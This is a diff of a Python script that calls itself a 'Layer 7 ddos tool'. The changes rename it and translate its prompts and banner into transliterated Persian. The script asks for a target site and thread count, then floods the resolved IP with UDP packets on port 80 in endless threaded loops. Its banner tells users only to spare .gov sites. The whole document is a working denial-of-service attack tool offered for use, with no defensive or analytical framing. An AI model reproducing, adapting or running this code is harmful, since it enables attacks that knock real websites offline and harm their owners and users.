@@ -1,6 +1,6 @@
 print ('''
 	   /////    /////    /////////////
-	  CCCCC/   CCCCC/   | CC-attack |/
+	  CCCCC/   CCCCC/   | ss.py |/
 	 CC/      CC/       |-----------|/ 
 	 CC/      CC/       |  Layer 7  |/ 
 	 CC/////  CC/////   | ddos tool |/ 
@@ -9,7 +9,7 @@ print ('''
 Version 1.0 (2023)
 						C0d3d by Sm3R
 ┌─────────────────────────────────────────────┐
-│        Tos: Don't attack .gov website       │
+│         lotfan be .gov ddos nazanid       │
 ├─────────────────────────────────────────────┤
 │                                │
 ├─────────────────────────────────────────────┤
@@ -21,13 +21,13 @@ import socket
 import sys
 import _thread
 
-site = input("Enter your site url => ")
-thread_count = input("Enter your thread => ")
+site = input("_>address site ra vared knid => ")
+thread_count = input("_>qodrat ra vared knid => ")
 ip = socket.gethostbyname(site)
 UDP_PORT = 80
 MESSAGE = '@sm3rmc!!!'
-print("UDP target IP:", ip)
-print("UDP target port:", UDP_PORT)
+print("_>IP HADAF:", ip)
+print("_>PORT HADAF:", UDP_PORT)
 time.sleep(3)
 def ddos(i):
     while 1:
@@ -41,7 +41,7 @@ def ddos(i):
         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
-        print("Packet Sent")
+        print("           •HAMLE SHOD•")
        
 for i in range(int(thread_count)):
     try:
